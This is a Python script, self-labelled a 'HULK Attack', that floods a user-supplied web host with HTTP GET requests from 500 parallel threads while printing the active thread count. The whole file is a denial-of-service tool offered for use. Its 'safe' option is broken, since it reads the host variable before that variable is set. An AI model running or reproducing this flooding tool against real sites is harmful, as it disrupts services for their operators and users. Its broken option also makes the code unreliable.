import sys
import re
import threading
import requests
import time

class HTTPThread(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)

    def run(self):
        while True:
            try:
                r = requests.get("http://" + host + "/")
                if r.status_code == 200:
                    print("Success: " + r.url)
                else:
                    print("Failed: " + r.url)
            except Exception as e:
                print("Error: " + str(e))
            time.sleep(0.1)

class MonitorThread(threading.Thread):
    def run(self):
        while True:
            print("Active Threads: " + str(threading.active_count()))
            time.sleep(1)

def usage():
    print("Usage: python main.py <url> [safe]")
    print("Example: python main.py www.example.com safe")

def set_safe():
    global host
    m = re.search('(https?\://)?([^/]*)/?.*', host)
    host = m.group(2)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        usage()
        sys.exit()
    else:
        if sys.argv[1] == "help":
            usage()
            sys.exit()
        else:
            print("-- HULK Attack Started --")
            if len(sys.argv) == 3:
                if sys.argv[2] == "safe":
                    set_safe()
            url = sys.argv[1]
            if url.count("/") == 2:
                url = url + "/"
            m = re.search('(https?\://)?([^/]*)/?.*', url)
            host = m.group(2)
            threads = []
            for i in range(500):
                t = HTTPThread()
                t.start()
                threads.append(t)
            t = MonitorThread()
            t.start()
            for t in threads:
                t.join()